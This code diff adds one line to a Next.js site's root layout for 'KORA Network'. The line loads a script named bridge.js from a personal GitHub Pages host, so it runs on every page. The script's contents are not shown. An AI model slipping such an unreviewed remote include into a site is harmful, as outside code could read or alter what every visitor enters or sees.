@@ -60,6 +60,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
             strategy="afterInteractive"
           />
         ) : null}
+        <Script id="izakhono-portfolio-growth" src="https://bevanshelton-netizen.github.io/Downloads/portfolio-growth/bridge.js" data-platform="kora" strategy="afterInteractive" />
         <a className="skipLink" href="#page-content">Skip to content</a>
         <header className="top">
           <Link className="logo" href="/" aria-label="KORA Network home"><KoraMark /><span className="logoWords"><b>{brand.name}</b><small>NETWORK</small></span></Link>
